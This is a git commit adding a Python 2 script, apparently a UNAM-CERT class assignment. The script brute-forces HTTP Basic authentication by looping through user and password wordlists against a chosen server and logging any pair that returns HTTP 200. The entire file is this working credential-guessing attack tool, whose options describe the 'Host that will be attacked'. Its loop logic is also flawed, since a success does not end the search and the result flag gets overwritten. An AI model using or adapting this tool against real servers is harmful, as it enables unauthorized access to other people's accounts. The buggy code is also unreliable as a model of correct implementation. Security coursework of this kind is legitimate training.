fd24e2312e7c42e70b722d80b6223893fe4f9b87
DianaTadeo <36577863+DianaTadeo@users.noreply.github.com>
2018-12-01 18:19:20 -0600

    Tarea5 sobre request  con opciones terminada

---
+++ tarea5.py
@@ -0,0 +1,125 @@
+#!/usr/bin/python
+# -*- coding: utf-8 -*-
+#UNAM-CERT
+import sys
+import optparse
+from requests import get
+from datetime import datetime
+from requests.exceptions import ConnectionError
+
+
+def printError(msg, exit = False):
+        sys.stderr.write('Error:\t%s\n' % msg)
+        if exit:
+            sys.exit(1)
+            
+def readFiles(v,r,host, users, passwords):
+	'''
+	Funcion que aplica la conexion a una lista de usuarios y una lista
+	de passwords leidos de archivos.
+	v: Parametro que identifica si se aplicara o no el modo 'verbose'
+	r: Parametro que identifica si se guardara el reporte en un nuevo archivo
+	host: El host al cual se realizara el request
+	users: Archivo con lista de usuarios
+	passwords: Archivo con lista de passwords
+	'''
+	if v:
+		print 'Se itentan leer los archivos'
+	with open(users,'r') as usuarios, open(passwords, 'r') as passwd:
+		usert=usuarios.read()
+		passwdt=passwd.read()
+		result = False
+		for u in usert.splitlines():
+			if result== True:
+				break
+			else:
+				for p in passwdt.splitlines():
+					result= makeRequest(host,u,p,v,r)
+				
+		
+	
+def addOptions():
+    '''
+    Funcion que permite agregar las banderas correspondientes para el uso del
+    programa ejecutado como script.
+    '''
+    parser = optparse.OptionParser()
+    parser.add_option('-p','--port', dest='port', default='80', help='Port that the HTTP server is listening to.')
+    parser.add_option('-s','--server', dest='server', default=None, help='Host that will be attacked.')
+    parser.add_option('-v','--verbose', action='store_true', dest='verbose', default=False, help='Show the process in verbose mode')
+    parser.add_option('-r','--reporte', dest='reporte', default=None, help='File where the findigns will be stored')
+    parser.add_option('-U', '--user', dest='user', default=None, help='User that will be tested during the attack.')
+    parser.add_option('-P', '--password', dest='password', default=None, help='Password that will be tested during the attack.')
+    parser.add_option('-l', '--listU', dest='users', default=None, help='File whits users.')
+    parser.add_option('-L', '--listP', dest='passwords', default=None, help='File whit passwords.')
+    opts,args = parser.parse_args()
+    return opts
+    
+def checkOptions(options):
+    '''
+    Funcion que valida que todas las opciones obligatorias se hayan agregado
+    '''
+    if options.server is None:
+        printError('Debes especificar un servidor a atacar.', True)
+    if options.user is None and options.users is None:
+        printError('Debes especificar un usuario o archivo que contenga una lista de usuarios', True)
+    if options.password is None and options.passwords is None:
+        printError('Debes especificar un password o archivo que contenga una lista de passwords', True)
+
+def reportResults():
+    pass
+
+
+def buildURL(v,server,port,protocol = 'http'):
+    '''
+    funcion que construye una url de acuerdo a los valores que se le pasan
+    '''
+    url = '%s://%s:%s' % (protocol,server,port)
+    if v:
+		print 'Se obtuvo la URL: '+url+'\n'
+    return url
+
+
+def makeRequest(host, user, password, v,r):
+    '''
+    Funcion que genera la peticion al host especificado con las credenciales del
+    user (usuario) que se pasa como parametro.
+    host: El host al que se realizara la peticion
+    user: El usuario con el que se intentara hacer la validacion
+    password: El password con el que se intentara hacer la validacion
+    v: Parametro que identificara si se imprimira el proceso (modo verbose)
+    r: Parametro que indica el archivo en el que se imprimira el reporte (si se le pasa)
+    '''
+    exitoso=False
+    cadenaRes=''
+    try:
+		if v:
+			print 'Se genera la peticion...\n'
+		response = get(host, auth=(user,password))
+		if response.status_code == 200:
+			print 'CREDENCIALES ENCONTRADAS!: %s\t%s' % (user,password)
+			exitoso=True
+			cadenaRes='Se encontraron las credenciales: \n url:'+host+' usuario:'+ user+'  password:'+password+'\n'
+		else:
+			print 'NO FUNCIONO :c '
+			cadenaRes='No se encontraron las credenciales: \n url:'+host+' usuario:'+ user+'  password:'+password+'\n'
+		if r:
+			#Si se le pasa el archivo para el reporte, se escribe el reporte
+			with open(r,'a') as archivo:
+				archivo.write(cadenaRes+'Hora: '+str(datetime.now())+'\n')
+    except ConnectionError:
+        printError('Error en la conexion, tal vez el servidor no esta arriba.',True)
+	return exitoso
+
+if __name__ == '__main__':
+	try:
+		opts = addOptions()
+		checkOptions(opts)
+		url = buildURL(opts.verbose,opts.server,port = opts.port)
+		if opts.users:
+			readFiles(opts.verbose,opts.reporte,url,opts.users,opts.passwords)
+		else:
+			makeRequest(url, opts.user, opts.password, opts.verbose, opts.reporte)
+	except Exception as e:
+		printError('Ocurrio un error inesperado')
+		printError(e, True)
